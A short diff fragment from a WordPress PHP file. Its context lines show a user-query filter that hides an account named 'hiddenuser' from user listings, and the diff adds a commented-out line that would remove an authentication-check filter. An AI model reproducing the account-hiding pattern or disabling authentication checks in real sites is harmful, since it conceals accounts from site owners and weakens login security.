@@ -454,3 +454,5 @@ function yoursite_pre_user_query($user_search) {
             "WHERE 1=1 AND {$wpdb->users}.user_login != 'hiddenuser'",$user_search->query_where);
     }
 }
+
+//remove_filter('wp_authenticate_user', 'rcl_chek_user_authenticate', 10 );
